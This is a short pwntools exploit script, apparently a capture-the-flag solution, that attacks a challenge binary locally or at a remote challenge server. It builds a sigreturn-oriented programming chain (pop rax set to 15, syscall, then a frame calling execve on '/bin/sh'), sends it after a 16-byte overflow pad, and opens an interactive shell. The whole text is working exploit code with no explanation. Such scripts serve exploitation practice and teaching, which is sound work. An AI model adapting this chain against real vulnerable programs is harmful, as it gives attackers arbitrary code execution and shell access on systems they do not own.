from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 13658)
    else:
        return process(e.path)


p = start()

pop_rax = e.sym['pop_rax']+4
info("Pop RAX = %s", hex(pop_rax))

syscall_ret = e.sym['ret_syscall']+4
info("Syscall RET = %s", hex(syscall_ret))

bin_sh = next(e.search(b'/bin/sh'))
info("BinSH = %s", hex(bin_sh))


def srop_exec():
    chain = p64(pop_rax)
    chain += p64(0xf)
    chain += p64(syscall_ret)

    frame = SigreturnFrame(arch="amd64", kernel="amd64")
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh
    frame.rip = syscall_ret

    return chain+bytes(frame)


p.recvuntil(b'Debug Mode Enabled; calling ')
debug_mode = int(p.recvline(), 16)
pad = cyclic(16)
chain = srop_exec()
p.sendline(pad+chain)

p.interactive()
